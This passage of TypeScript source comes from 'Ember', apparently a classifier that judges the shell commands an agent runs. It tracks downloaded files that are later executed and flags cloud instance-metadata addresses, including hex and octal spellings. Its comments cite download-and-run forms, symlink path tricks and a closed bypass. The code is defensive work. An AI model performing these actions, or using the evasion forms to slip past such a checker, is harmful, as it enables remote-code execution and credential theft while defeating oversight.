   * (already escape, and the file there is the download: onRecord), not a foreign scope's (another system Ember can't
   * read). One this same line marks as a download is recorded all the same (commands-held-x9-2, x9-6): nothing is saved
   * yet, so the file there now is what runs if the fetch fails, saves elsewhere or, by another reading of the line's
   * options (runRow), isn't one at all. Running it asks as running a download does, and what its text says stands
   * beside that. A pattern, a stream (`/dev/fd/3`, `/proc/self/fd/0`) or more scripts than Ember reads (MAX_SCRIPTS)
   * asks: what would run can't be read first.
   */
  recordScript(a: Arg, as: ScriptRef["as"], sc: Scope, candidate = false): void {
    if (a.v === null || a.v === "-" || a.v === "/dev/stdin" || sc.foreign) return;
    if (a.glob) { this.unclear("unclear.script-pattern", "It runs a script named by a pattern, which Ember can't read first."); return; }
    if (!isAbsolute(a.v, sc.path.flavour) && !a.v.startsWith("~") && !sc.cwd) return;
    if (this.onRecord(a, sc)) return;
    const savedHere = this.isDownloaded(a, sc);
    const abs = resolveTargetPath(a.v, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" });
    const stream = (p: string) => sc.path.flavour === "posix" && /^\/(dev|proc)\//.test(p);
    if (stream(abs)) {
      this.unclear("unclear.script-stream", SAYS.scriptStream);
      return;
    }
    // A shell or the kernel opens the name as written, walking `..` through links (`sh sub/../t.sh` with sub a link
    // runs the t.sh beside sub's target): the script is the file at the real path the target reports for that form,
    // never the lexical one. Without that report Ember can't tell which file runs, so it asks (L25). PowerShell and
    // Win32 remove `..` lexically themselves, as the lexical form does.
    const open = POSIX_OPENERS.has(as) && sc.path.flavour === "posix"
      ? physicalForm(a.v, { os: sc.os === "win32" ? "linux" : sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" })
      : null;
    let real = this.ctx.real?.get(abs);
    if (open !== null) {
      this.addProbe(open);
      real = this.ctx.real?.get(open);
      if (!real) { this.unclear("unclear.script-path", SCRIPT_UNSURE); return; }
      if (stream(real)) { this.unclear("unclear.script-stream", SAYS.scriptStream); return; }
    }
    // A secret or one of Ember's own files is never read as a script: running it already asks or is refused (the path's
    // own rule), and its text has no business on a card.
    if ([abs, ...(real ? [real] : [])].some(p => secretKind(p, "read", sc.path) !== null || isEmberPath(p, sc.path))) return;
    const cwd = sc.cwd ?? "";
    const known = real !== undefined && real !== abs ? real : undefined;
    if (this.scripts.some(r => r.path === abs && r.as === as && r.cwd === cwd && r.open === (open ?? undefined))) return;
    if (this.scripts.length >= MAX_SCRIPTS) { this.unclear("unclear.scripts", "It runs more scripts than Ember reads first."); return; }
    const start = this.ctx.cwd || null;
    const project = ownFolder(a.v, sc, start) && (known === undefined || (start !== null && isUnder(known, start, sc.path)));
    const ref: ScriptRef = { path: abs, as, cwd, ...(open !== null ? { open } : {}), ...(known !== undefined ? { real: known } : {}), ...(project ? { project: true as const } : {}) };
    this.scripts.push(ref);
    if (candidate) this.candidates.set(ref, { written: this.written.length, unnamed: this.writesUnnamed });
    if (savedHere) this.savedHere.add(ref);
  }

  /**
   * Whether a script this command runs is one it writes, moves or unpacks itself. Order doesn't matter for a script
   * named outright (a loop or a function may run it again after the write); a candidate counts only what was written
   * before it (`git pull` in cmd isn't the git.cmd it may resolve to).
   */
  protected scriptWritten(): boolean {
    return this.scripts.some(r => {
      // A download this line saves under the script's name is what it writes: that already asks, as running a download.
      if (this.savedHere.has(r)) return false;
      // By either name: `printf … > /x/t.sh; sh l/../t.sh` (l → /x/sub) writes the very file it runs.
      const names = r.real !== undefined ? [r.path, r.real] : [r.path];
      const hit = (w: { p: string; env: PathEnv }) => names.some(n => isUnder(n, w.p, w.env));
      const snap = this.candidates.get(r);
      if (snap) return snap.unnamed || this.written.slice(0, snap.written).some(hit);
      return this.writesUnnamed || this.written.some(hit);
    });
  }

  /**
   * A shell script run directly (`./x.sh`, `env ./x.sh`, `.\x.ps1`): PowerShell runs a `.ps1`, and for a path with no
   * extension the first of `x.ps1`, `x.bat`, `x.cmd` there; a POSIX shell runs the file by its `#!` line (a text file
   * without one, by the shell itself). A batch file is recorded by dispatch's batch branch.
   */
  scriptByPath(nameArg: Arg, pn: ReturnType<typeof programName>, sc: Scope): void {
    if (sc.family === "powershell") {
      if (/\.ps1$/i.test(pn.base)) this.recordScript(nameArg, "powershell", sc);
      else if (pn.ext === "" && nameArg.v !== null && !nameArg.glob) {
        this.recordScript(lit(`${nameArg.v}.ps1`), "powershell", sc, true);
        for (const e of [".bat", ".cmd"]) this.recordScript(lit(nameArg.v + e), "cmd", sc, true);
      }
    } else if (sc.family === "posix" && pn.ext !== ".bat" && pn.ext !== ".cmd") this.recordScript(nameArg, "shebang", sc);
  }

  /** A program that writes files Ember can't name (writesUnnamedFiles): where they go, for the task's memory. */
  unnamedWrites(key: string, args: readonly Arg[], sc: Scope): void {
    if (!writesUnnamedFiles(key, args)) return;
    this.writesUnnamed = true;
    const at = unnamedWriteFolders(key, args, sc);
    if (at === null) this.unnamedAnywhere = true;
    else for (const p of at) if (!this.unnamedAt.includes(p)) this.unnamedAt.push(p);
  }

  /**
   * Records a file this command downloads (§3.4.7), resolved against the scope's folder. In a folder Ember can't tell
   * (`env -C src`, `sudo -D "$d"`), a name it can't place is a file of unknown name anywhere (commands-z6-3).
   */
  download(p: string | null, sc: Scope): void {
    if (!p) return;
    if (!sc.cwd && !isAbsolute(p, sc.path.flavour) && !(p.startsWith("~") && sc.home)) { this.markUnnamed(null, sc); return; }
    const abs = resolveTargetPath(p, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" });
    // Where it really lands too (§3.6): through a link (`-o link/x`) or `..` after one (`-o sub/../x`), so running it
    // later by that name (`sh /data/x`) is running the download.
    const phys = this.physical(p, "write", sc);
    for (const n of [abs, this.ctx.real?.get(abs), phys === null ? undefined : this.ctx.real?.get(phys)]) {
      if (n !== undefined && !this.downloads.includes(n)) this.downloads.push(n);
    }
  }

  /**
   * A download whose saved name Ember can't tell (curl -J, wget -r or -i, an output word it can't see all of): it asks,
   * and a file of unknown name in `folder` (resolved in the scope's folder; null or an unknown folder: anywhere) counts
   * as downloaded, so running anything from there or below later in the task asks, the folder's own build and test
   * tools too (UNNAMED_DOWNLOAD: commands-remote-r5-1, c5-2).
   */
  downloadUnnamed(folder: string | null, sc: Scope): void {
    this.add("destroy", "download.unnamed", SAYS.downloadsUnnamed);
    this.markUnnamed(folder, sc);
  }

  /**
   * Records that files of names Ember can't tell in `folder` (or anywhere) may hold code this task fetched: a patch it
   * downloaded applied there, a pull from an address (UNNAMED_DOWNLOAD; commands-remote-c5-4). It asks nothing itself.
   */
  markUnnamed(folder: string | null, sc: Scope): void {
    const mod = sc.path.flavour === "win32" ? win32 : posix;
    const at = folder === null ? null
      : isAbsolute(folder, sc.path.flavour) || (folder.startsWith("~") && sc.home) || sc.cwd ? resolveTargetPath(folder, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "" })
      : null;
    const root = sc.path.flavour === "win32" ? (sc.cwd ? win32.parse(sc.cwd).root : "C:\\") : "/";
    const mark = mod.join(at ?? root, UNNAMED_DOWNLOAD);
    if (!this.downloads.includes(mark)) this.downloads.push(mark);
  }

  /**
   * The names a download may be saved under when it takes the name its address ends in (`curl -O`, wget, aria2c), for
   * an address Ember sees or one a variable holds part of (commands-remote-r6-1): the last part of each form the text
   * gives the word, before any `?` or `#` (`fallback` for an address that ends in `/`). `unnamed`: a form whose last
   * part Ember can't see (`$URL`, `…/tool-$V.sh` with V unset in the text), or with `patterns` one that holds curl's
   * `[1-3]` or `{a,b}`, which name several files; the caller records those as unnamed in the folder it saves into.
   */
  addressNames(a: Arg, o: { fallback?: string; patterns?: boolean } = {}): { names: string[]; unnamed: boolean } {
    const names: string[] = [];
    let unnamed = false;
    for (const f of this.knownForms(a, true)) {
      const form = f ?? UNSEEN;
      const q = form.search(/[?#]/);
      const path = q >= 0 ? form.slice(0, q) : form;
      const name = path.slice(path.lastIndexOf("/") + 1);
      if (name.includes(UNSEEN) || (o.patterns === true && /[[\]{}]/.test(name))) unnamed = true;
      else if (name !== "" || o.fallback !== undefined) names.push(name || (o.fallback ?? ""));
    }
    return { names: [...new Set(names)], unnamed };
  }

  /**
   * A download saved as a word Ember can't see all of (`-o "$f"`, `-OutFile $f`, `-OutFile (Join-Path …)`): judged as
   * the file it writes (Ember's own refusal), each name the text gives the word recorded as the download, and a name
   * with a part Ember can't see recorded as unnamed in the folder its seen start names (downloadUnnamed). It asks
   * either way: those names are only what the text says, not what the shell is sure to use (commands-remote-r5-1).
   */
  downloadTo(a: Arg, sc: Scope): void {
    this.usePath(a, "write", sc);
    const win = sc.path.flavour === "win32";
    const forms = this.formsOf(a.parts ?? [{ name: null }], win ? this.psVarValues : this.varValues);
    const folders = new Set<string | null>();
    for (const f of forms) {
      const form = f.startsWith(PATTERN) ? f.slice(1) : f;
      const cut = form.indexOf(UNSEEN);
      if (cut < 0) { this.download(form, sc); continue; }
      const known = form.slice(0, cut);
      const slash = win ? Math.max(known.lastIndexOf("\\"), known.lastIndexOf("/")) : known.lastIndexOf("/");
      // Its seen folder, the scope's folder for a name with no folder in its seen start, or anywhere.
      folders.add(slash >= 0 ? known.slice(0, slash + 1) : known === "" ? null : ".");
    }
    if (folders.size === 0) this.add("destroy", "download.unnamed", SAYS.downloadsUnnamed);
    for (const f of folders) this.downloadUnnamed(f, sc);
  }

  /**
   * A copy of a download under another name (`mv x.py y.py`, `cat x.py > y.py`): a download too (commands-remote-c2-2).
   * `ifFile`: the name may be a folder the copy goes into (its file is recorded on its own), so it stops counting
   * once the target says it is one.
   */
  carryDownload(p: string, sc: Scope, ifFile = false): void {
    this.download(p, sc);
    if (ifFile && sc.cwd) {
      const abs = resolveTargetPath(p, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd });
      if (!this.downloadsIfFile.includes(abs)) this.downloadsIfFile.push(abs);
    }
  }

  /**
   * The copies a Windows copy, move, rename or link makes of a download (PowerShell's Copy-Item, Move-Item, Rename-Item
   * and New-Item links with their aliases; cmd's copy, move, ren, xcopy and mklink): downloads too, as copyLike carries
   * the POSIX tools' (commands-remote-c2-2). Into a folder, the file of its name there; a name that may be a folder
   * counts until the target says it is one. `asIs`: the destination is the new file's own name (a rename, a link). A
   * source Ember can't name (a pipeline's items) counts while the task has downloaded anything (mayBeDownload).
   */
  carryCopies(sources: readonly Arg[], dest: Obj, sc: Scope, asIs = false): void {
    if (dest.abs === null) return;
    const mod = sc.path.flavour === "win32" ? win32 : posix;
    const intoFolder = /[\\/]$/.test(dest.text) || /^\.\.?$/.test(dest.text);
    for (const s of sources) {
      if (!this.isDownloaded(s, sc) && !this.mayBeDownload(s, sc)) continue;
      const name = asIs || s.v === null || s.glob ? null : baseName(s.v.replace(/[\\/]+$/, ""), sc.path.flavour);
      const named = name !== null && name !== "." && name !== "..";
      if (named) this.carryDownload(mod.join(dest.abs, name), sc);
      if (asIs) this.carryDownload(dest.abs, sc);
      else if (!named) this.carryUnnamed(dest.abs, intoFolder, sc);
      else if (!intoFolder) this.carryDownload(dest.abs, sc, true);
    }
  }

  /**
   * A copy of a download whose name Ember can't tell, into `dest`: a file of unknown name in that folder, never the
   * folder itself (commands-remote-r4-3); `dest` itself too while the target doesn't say it is a folder.
   */
  carryUnnamed(dest: string, intoFolder: boolean, sc: Scope): void {
    if (!intoFolder) this.carryDownload(dest, sc, true);
    this.carryDownload((sc.path.flavour === "win32" ? win32 : posix).join(dest, UNNAMED_COPY), sc);
  }

  /**
   * Whether a check on this line found a file to be a download the task saved under a name Ember knows (isDownloaded,
   * downloadedProjectFile), not only one that may be, by a mark for a download or copy Ember couldn't name
   * (UNNAMED_DOWNLOAD, UNNAMED_COPY). It only chooses the card's words (`add`).
   */
  private namedHit = false;

  /**
   * Whether this task downloaded, under `folder`, a file a build tool, test runner or package manager there runs
   * or follows by its name (a Makefile, package.json, conftest.py, a test file: PROJECT_FILE), so running the tool
   * runs the download (commands-remote-c2-2).
   */
  downloadedProjectFile(folder: string, sc: Scope, extra?: RegExp): boolean {
    const all = [...this.ctx.downloaded, ...this.downloads];
    // A download whose name a build tool runs or follows: one of the shared project files, or one of the tool's own
    // sources (`.go`/`go.mod` for go, `.rs` for cargo: extra), which `go run .` and `cargo run` build by folder
    // (commands-remote-r8-2). `extra` is a tool's own, never widened into PROJECT_FILE for every tool.
    const isProject = (name: string): boolean => PROJECT_FILE.test(name) || (extra?.test(name) ?? false);
    // One of the tool's files, saved under its name.
    if (all.some(d => d !== folder && unnamedFolder(d, sc.path) === null && isUnder(d, folder, sc.path) && isProject(baseName(d, sc.path.flavour)))) {
      this.namedHit = true;
      return true;
    }
    // A download of a name Ember can't tell may be any of the tool's files, in its folder or one it works in.
    if (all.some(d => {
      const f = baseName(d, sc.path.flavour) === UNNAMED_DOWNLOAD ? unnamedFolder(d, sc.path) : null;
      return f !== null && (isUnder(f, folder, sc.path) || isUnder(folder, f, sc.path));
    })) return true;
    const unnamed = (d: string): boolean => baseName(d, sc.path.flavour) === UNNAMED_COPY;
    // A copy Ember can't name may be one, when a download of this task is one or may be a folder (no extension).
    const mayBe = all.some(d => !unnamed(d) && (isProject(baseName(d, sc.path.flavour)) || !/\.[^.\\/]+$/.test(baseName(d, sc.path.flavour))));
    return all.some(d => d !== folder && isUnder(d, folder, sc.path) && (unnamed(d) ? mayBe : isProject(baseName(d, sc.path.flavour))));
  }

  /**
   * Whether a word Ember can't name (`xargs cp {} y.sh`'s input, `cp "$f" y.sh`) may be a download: when this task
   * downloaded anything, it may be (commands-remote-v4-5).
   */
  mayBeDownload(a: Arg, sc?: Scope): boolean {
    if (a.v !== null || (this.ctx.downloaded.size === 0 && this.downloads.length === 0)) return false;
    // The values the text gives it, when Ember sees them all (`for f in *.txt`): only one that can be a download, or
    // a folder that holds one, counts (commands-remote-r4-3).
    if (!sc || !a.parts || sc.path.flavour !== "posix" || !sc.cwd) return true;
    const forms = this.formsOf(a.parts);
    if (forms.some(f => f.includes(UNSEEN))) return true;
    const at = { os: sc.os, home: sc.home ?? "", cwd: sc.cwd };
    const all = [...this.ctx.downloaded, ...this.downloads].filter(d => baseName(d, sc.path.flavour) !== UNNAMED_COPY);
    return forms.some(f => {
      if (!f.startsWith(PATTERN)) return this.isDownloaded(lit(f), sc) || this.holdsDownload(lit(f), sc);
      let re: RegExp;
      try { re = globRegExp(resolveTargetPath(f.slice(1), at), sc.path, true); } catch { return true; /* a pattern the matcher can't read may match anything */ }
      // The download, or a folder above it that the pattern names (its copy holds the download).
      return all.some(d => { for (let p = d; p !== posix.dirname(p); p = posix.dirname(p)) if (re.test(p)) return true; return false; });
    });
  }

  /**
   * Whether a glob a program is given to run (`python3 a.p*`) matches a file this task downloaded by name: unlike
   * `mayBeDownload`, this reads the written pattern, which has `a.v` set (commands-remote-r8-2). A pattern Ember can't
   * resolve, or one with a part it can't see, matches anything the task downloaded (fail closed).
   */
  globMatchesDownload(a: Arg, sc: Scope): boolean {
    if (!a.glob || !sc.cwd) return false;
    const all = [...this.ctx.downloaded, ...this.downloads].filter(d => unnamedFolder(d, sc.path) === null);
    if (all.length === 0) return false;
    const forms = a.parts ? this.formsOf(a.parts) : [a.v === null ? UNSEEN : PATTERN + (a.pattern ?? a.v)];
    const at = { os: sc.os, home: sc.home ?? "", cwd: sc.cwd };
    return forms.some(f => {
      if (f.includes(UNSEEN)) return true;
      const pat = f.startsWith(PATTERN) ? f.slice(1) : f;
      let re: RegExp;
      try { re = globRegExp(resolveTargetPath(pat, at), sc.path, true); } catch { return true; }
      return all.some(d => re.test(d));
    });
  }

  /** Whether a folder holds a file this task downloaded (by the name written: what `rsync -R` or --files-from copies). */
  holdsDownload(a: Arg, sc: Scope): boolean {
    if (a.v === null || !sc.cwd) return false;
    const abs = resolveTargetPath(a.v, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd });
    return [...this.ctx.downloaded, ...this.downloads].some(d => d !== abs && isUnder(d, abs, sc.path));
  }

  /**
   * Whether a path is a file this task downloaded, or inside a downloaded folder. `unnamed`: a copy Ember couldn't name
   * counts for every file in its folder (a project tool's words aren't files it runs: commands-remote-r4-3). `line`
   * false: only what earlier commands of the task downloaded counts, not what this line marks (onRecord).
   */
  isDownloaded(a: Arg, sc: Scope, unnamed = true, line = true): boolean {
    const here = line ? this.downloads : [];
    if (a.v === null || !sc.cwd || (this.ctx.downloaded.size === 0 && here.length === 0)) return false;
    const abs = resolveTargetPath(a.v, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd });
    const all = [...this.ctx.downloaded, ...here].filter(d => unnamed || baseName(d, sc.path.flavour) !== UNNAMED_COPY);
    // Its real path too (§3.6): a link to a download, or `..` walked through a link (`sh sub/../x`), is the download.
    const phys = this.physical(a.v, "exec", sc);
    const names = [abs, this.ctx.real?.get(abs), phys === null ? undefined : this.ctx.real?.get(phys)].filter((n): n is string => typeof n === "string");
    // Downloaded by an earlier command of this task, or earlier in this same command (`curl -o x … && sh x`).
    const hits = all.filter(d => names.some(n => inDownload(n, d, sc.path)));
    if (hits.length > 0) {
      if (hits.some(d => unnamedFolder(d, sc.path) === null)) this.namedHit = true;
      return true;
    }
    // A Windows path in cmd or PowerShell reached from a distro: the distro recorded it under the drive mount.
    if (sc.fromWsl && /^[A-Za-z]:[\\/]/.test(abs) && this.ctx.wsl) {
      const mount = this.ctx.wsl.mountRoot;
      const env = pathEnv({ flavour: "posix", os: "linux", home: null, cwd: null, mountRoot: mount });
      const m = toMount(abs, mount);
      const under = all.filter(d => inDownload(m, d, env));
      if (under.some(d => unnamedFolder(d, env) === null)) this.namedHit = true;
      return under.length > 0;
    }
    return false;
  }

  /**
   * Whether a path is a download an earlier command of this task saved (the task's record): the file on the target is
   * then the download, so running it asks and it is not read as a script. A mark this same line makes is no such
   * thing yet (recordScript).
   */
  onRecord(a: Arg, sc: Scope): boolean {
    return this.isDownloaded(a, sc, true, false);
  }
}

/** A finding-free classification object with one unclear finding (the classifier's own failure). */
function internalUnclear(shell: ShellId, cwd: string): ClassificationExtra {
  return {
    shell, family: SHELL_FAMILY[shell] ?? "posix",
    findings: [{ cls: "unclear", rule: "internal", says: SAYS.unclear, program: "", objects: [], widening: [], at: -1 }],
    refuse: null, probe: [], needsGit: false, downloads: [], programs: [], commands: [], cwd, windowsReach: false, scripts: [],
    // What it writes is unknown too: every script counts as the task's own later (L8's padding bypass).
    writes: [], writesAnywhere: true,
  };
}

/**
 * Classifies a command for a target (§3.4): its findings (empty: an ordinary command), Ember's refusal, the paths to
 * probe, whether a push needs git facts, what it downloads and runs, and a `cd`-only folder. Never throws.
 */
export function classifyCommand(text: string, shell: ShellId, ctx: ClassifyContext): Classification {
  try {
    // A command line's simple `[[ … ]]` is judged as `[ … ]` (unroll.ts, commands-remote-r6-2); anything else, every
    // loop and a script's text included, as written.
    const judged = SHELL_FAMILY[shell] === "posix" && ctx.script !== true ? judgedText(text) : text;
    const cls = new Engine(ctx, shell).run(judged);
    return judged === text ? cls : ({ ...cls, writtenOut: true } as ClassificationExtra);
  } catch {
    return internalUnclear(shell, ctx.cwd);
  }
}

// ------------------------------------------------------------------------------------------------------------------
// The engine: walking each family's syntax, then judging each simple command.

/** One simple command being judged, for the program handlers. */
interface H {
  e: Engine;
  sc: Scope;
  s: Simple;
  /** The table key (lower-cased where lookup is case-insensitive, extension removed). */
  key: string;
  /** The program as reported (a cmdlet's canonical name). */
  prog: string;
  nameArg: Arg;
  args: Arg[];
  /** The program word's lookup facts (its extension, whether it is reached through WSL interop). */
  pn: ReturnType<typeof programName>;
  /**
   * The scope the shell opens the command's redirections in, when `sc` is a folder the program or a wrapper moves into
   * (`git -C sub`, `patch -d src`, `env -C src`): `< x.patch` is the shell's file there (commands-remote-x6-4,
   * commands-y6-4).
   */
  shellSc?: Scope;
}
type Handler = (h: H) => void;

/** A program's handler by key: native programs (every family), then PowerShell cmdlets and cmd built-ins. */
const NATIVE: Record<string, Handler> = {};
const CMDLETS: Record<string, Handler> = {};
const CMD_BUILTINS: Record<string, Handler> = {};
const reg = (table: Record<string, Handler>, names: readonly string[], fn: Handler): void => { for (const n of names) table[n] = fn; };

/** A substitution that is only `pwd`, with no arguments, redirections or assignments. */
function lonePwd(list: PList): boolean {
  const item = list.items.length === 1 ? list.items[0] : null;
  const pipe = item && !item.background && item.pipes.length === 1 ? item.pipes[0] : null;
  const cmd = pipe && !pipe.bang && pipe.cmds.length === 1 ? pipe.cmds[0] : null;
  return cmd !== null && cmd.kind === "simple" && cmd.assigns.length === 0 && cmd.redirs.length === 0 && cmd.words.length === 1
    && cmd.words[0].segs.every(seg => seg.t === "lit") && cmd.words[0].segs.map(seg => (seg.t === "lit" ? seg.s : "")).join("") === "pwd";
}
/** A PowerShell subexpression that is only Get-Location (or its aliases pwd and gl), with no arguments or redirections. */
function lonePsLocation(list: PsStatement[]): boolean {
  const el = list.length === 1 && list[0].assign === null && list[0].elements.length === 1 ? list[0].elements[0] : null;
  return el !== null && el.kind === "command" && !el.call && !el.background && el.args.length === 0 && el.redirs.length === 0
    && el.name.segs.every(seg => seg.t === "lit") && /^(get-location|pwd|gl)$/i.test(el.name.segs.map(seg => (seg.t === "lit" ? seg.s : "")).join(""));
}

/** A file name that is the program's stdin (`-`, `/dev/stdin`, `/dev/fd/0`, `/proc/self/fd/0`). */
const STDIN_NAME = /^(-|\/dev\/stdin|\/dev\/fd\/0|\/proc\/(self|\d+)\/fd\/0)$/;
/** A file name that is one of the program's open descriptors (`/dev/fd/3`, `/proc/self/fd/3`); fd 0 is STDIN_NAME. */
const STREAM_NAME = /^(\/dev\/fd\/\d+|\/proc\/(self|\d+)\/fd\/\d+)$/;

/** Programs that print the text they are given: fetched text they print on is still the download (afterRun). */
const PRINTS_TEXT = new Set(["echo", "printf", "print", "cat"]);

/** A URL (`https://…`, `file:///…`, `s3://…`, `git@host:…`). */
const URL_LIKE = /^[a-z][a-z0-9+.-]*:\/\//i;
const SCP_LIKE = /^(?:[A-Za-z0-9._%+-]+@)?[A-Za-z0-9.-]+:(?![\\/]{2})/;

/** Programs that run a project's own code (its makefile, package scripts, build files or tests) from their folder. */
const PROJECT_RUNNERS = new Set([
  "make", "gmake", "mingw32-make", "nmake", "just", "rake", "invoke", "inv", "ant", "sbt", "lein", "gradle", "gradlew", "mvn", "mvnw",
  "nox", "tox", "task", "mage", "ninja", "cmake", "meson", "bazel", "bazelisk", "scons", "npm", "pnpm", "yarn", "bun", "cargo", "go",
  "dotnet", "msbuild", "pip", "pip3", "poetry", "pipenv", "uv", "pdm", "hatch", "composer", "bundle", "bundler", "mix", "pytest", "jest",
  "vitest", "mocha", "deno", "swift", "xcodebuild", "flutter", "dart", "stack", "cabal", "docker-compose", "podman-compose", "tsc",
]);
/**
 * Files those tools run or follow by their name, found in their folder (commands-remote-c2-2): makefiles and other
 * task files, package and build manifests, Python's test files and conftest.py, JavaScript tests and configs (code),
 * Go tests and Dockerfiles. A download of one there means the tool runs the download.
 */
const PROJECT_FILE = new RegExp([
  "^(gnu)?makefile$", "\\.mk$", "^justfile$", "^rakefile$", "^taskfile\\.ya?ml$", "^magefile\\.go$", "^tasks\\.py$", "^noxfile\\.py$",
  "^package\\.json$", "^setup\\.(py|cfg)$", "^pyproject\\.toml$", "^tox\\.ini$", "^pytest\\.ini$", "^conftest\\.py$", "^test_.*\\.py$", "_test\\.py$",
  "^cargo\\.toml$", "^build\\.rs$", "^cmakelists\\.txt$", "\\.cmake$", "^meson\\.build$", "^build\\.ninja$", "^build\\.gradle(\\.kts)?$",
  "^settings\\.gradle(\\.kts)?$", "^pom\\.xml$", "^build\\.xml$", "\\.(csproj|fsproj|vbproj|sln|props|targets)$", "^gemfile$", "^mix\\.exs$",
  "^composer\\.json$", "^build\\.sbt$", "^project\\.clj$", "^sconstruct$", "^(build|workspace)\\.bazel$", "^dockerfile$",
  "^(docker-)?compose\\.ya?ml$", "\\.(test|spec)\\.[cm]?[jt]sx?$", "\\.config\\.[cm]?[jt]s$", "_test\\.go$", "^deno\\.jsonc?$", "^pubspec\\.yaml$",
].join("|"), "i");

/** Compilers whose output, built from a downloaded source, is a download too (carryCompiled; commands-remote-r8-2). */
const COMPILERS = new Set([
  "gcc", "g++", "cc", "c++", "clang", "clang++", "rustc",
  // Every compiler's output carries the mark (commands-remote-r9-6): by `-o`, `-d`, `-out:` and their like.
  "gfortran", "gdc", "gccgo", "javac", "kotlinc", "scalac", "ghc", "swiftc", "dmd", "ldc2", "nim", "crystal", "mcs", "csc", "fpc", "ocamlc", "ocamlopt", "valac", "tcc",
  "nasm", "yasm", "as", "ld", "gold", "lld", "zig",
]);
/**
 * Programs whose output is text from the network without being fetch tools in their own right (commands-remote-r9-6):
 * what they print into a file is a download (`gh api … > a.sh`, `gh gist view --raw > a.sh`), and into a shell it is
 * download-and-run. Kept apart from FETCHERS, whose substitutions and options are judged as a fetch tool's.
 */
const TEXT_FETCHERS = new Set(["gh", "glab", "hub", "s3cmd", "b2", "gdown", "ipfs", "yt-dlp", "youtube-dl", "ncftpget", "lftp", "huggingface-cli", "hf", "az", "aws", "gcloud", "kubectl", "doctl", "mc", "rclone", "adb"]);
/** The instance metadata services of the clouds, by address and by name. */
const CLOUD_METADATA = /(^|[/@[:])(169\.254\.169\.254|169\.254\.170\.2|100\.100\.100\.200|fd00:ec2::254|a9fe:a9fe|metadata\.google\.internal|metadata\.azure\.com|instance-data)\.?([\]/:?#]|$)/i;
/**
 * A word that names one of them, also with its address written another way a resolver takes (commands-classes-y9-7):
 * one number, hex or octal parts, fewer than four parts (`0xa9fea9fe`, `2852039166`, `0251.0376.0251.0376`,
 * `169.254.43518`), a dot after it, inside an IPv6 address, or after the colons of curl's `--resolve`.
 */
function cloudMetadata(word: string): boolean {
  if (CLOUD_METADATA.test(word)) return true;
  for (const m of word.matchAll(/(?:^|\/\/|@)([0-9a-fx.]+)(?=[:/?#]|$)/gi)) {
    const parts = m[1].replace(/\.$/, "").split(".");
    if (parts.length > 4 || parts.some(p => !/^(0x[0-9a-f]+|\d+)$/i.test(p))) continue;
    const nums = parts.map(p => (/^0x/i.test(p) ? parseInt(p, 16) : /^0\d/.test(p) ? parseInt(p, 8) : parseInt(p, 10)));
    if (nums.some(n => Number.isNaN(n))) continue;
    // inet_aton's reading: the last part fills the bytes the earlier parts leave.
    const n = nums.slice(0, -1).reduce((sum, v, k) => sum + v * 256 ** (3 - k), 0) + nums[nums.length - 1];
    if (n === 0xa9fea9fe || n === 0xa9feaa02 || n === 0x646464c8) return true;
  }
  return false;
}
/** The text of each command substitution in a word as written: `$( … )` (never `$(( … ))`) and backticks. */
function substituted(raw: string): string[] {
  const text = raw.replace(/'[^']*'/g, "");
  const out: string[] = [];
  for (let k = 0; k < text.length; k++) {
    if (text[k] === "`") {
      const end = text.indexOf("`", k + 1);
      out.push(text.slice(k + 1, end < 0 ? text.length : end));
      k = end < 0 ? text.length : end;
    } else if (text.startsWith("$(", k) && text[k + 2] !== "(") {
      let depth = 1;
      let j = k + 2;
      for (; j < text.length && depth > 0; j++) depth += text[j] === "(" ? 1 : text[j] === ")" ? -1 : 0;
      out.push(text.slice(k + 2, depth === 0 ? j - 1 : text.length));
      k = j - 1;
    }
  }
  return out;
}
/** Programs whose output only says the machine's kind, the time, a version, or what another fetch returned. */
const SAYS_LITTLE = new Set(["uname", "date", "arch", "nproc", "getconf", "lsb_release", "dpkg", "rpm", "hostname", "whoami", "id", "curl", "wget", "echo", "printf", "mktemp", "sw_vers", "go", "rustc", "node", "python3", "python"]);
/** The words of a fetch that only gets a web address: the address, and the options that take no value and name no file. */
const FETCH_ONLY = /^(https?:\/\/[^\s"'@]+|-[sSfLkqI46]+|-q?O-|-|--(silent|show-error|fail|location|quiet|insecure|compressed|head|no-progress-meter|no-verbose))$/i;
/**
 * Filters such output may pass through, each with how many plain words it takes that aren't files (tr's two sets; a
 * sed, awk, grep or jq program): a word past those may be a file it reads instead of the pipe (`sed p notes`, `head
 * -c 500 notes`), and so may an option that names one (`grep -f notes`, `jq --rawfile`). Never xargs, which runs a
 * command (commands-classes-x9-5).
 */
const PASSES_ON: Readonly<Record<string, number>> = { tr: 2, sed: 1, awk: 1, grep: 1, jq: 1, cut: 0, head: 0, tail: 0, sort: 0, uniq: 0, wc: 0, tolower: 0 };
/** Whether a filter stage is given a file to read: more plain words than its own, or an option that names a file. */
function filterReadsFile(st: readonly string[]): boolean {
  const own = PASSES_ON[st[0]];
  let plain = 0;
  for (let k = 1; k < st.length; k++) {
    const w = st[k];
    if (w.startsWith("-")) { if (own === 1 && (/^-[A-Za-z]*f/.test(w) || /^--(file|from-file|rawfile|slurpfile|args|jsonargs)/.test(w))) return true; continue; }
    // An option's value that is a count, a field list or one separator character (`head -n 5`, `cut -d , -f 1,3`).
    if (st[k - 1].startsWith("-") && /^([+-]?[\d,-]+|[^A-Za-z0-9])$/.test(w)) continue;
    plain++;
  }
  return plain > own;
}
/**
 * Whether a substitution's text holds nothing of the user's files (sendsContents): each pipeline in it starts with a
 * program that says little (git only with rev-parse, describe or symbolic-ref; an interpreter only for its version;
 * a fetch only of web addresses, with no option that reads a file)
 * and goes on through filters given no file, with no redirection from a file and no substitution inside.
 */
function saysLittle(inner: string): boolean {
  if (/[<`]|\$\(|\$\{?[A-Za-z_]/.test(inner)) return false;
  for (const pipeline of inner.split(/;|&&|\|\||\n/)) {
    const stages = pipeline.split("|").map(st => st.trim().split(/\s+/));
    if (stages.length === 0 || stages[0][0] === "") return false;
    const [head, ...words] = stages[0];
    const prog = head.split("/").pop() ?? head;
    const versionOnly = /^(go|rustc|node|python3?)$/.test(prog) && !(words.length === 1 && /^(-v|-V|--version|version)$/.test(words[0]));
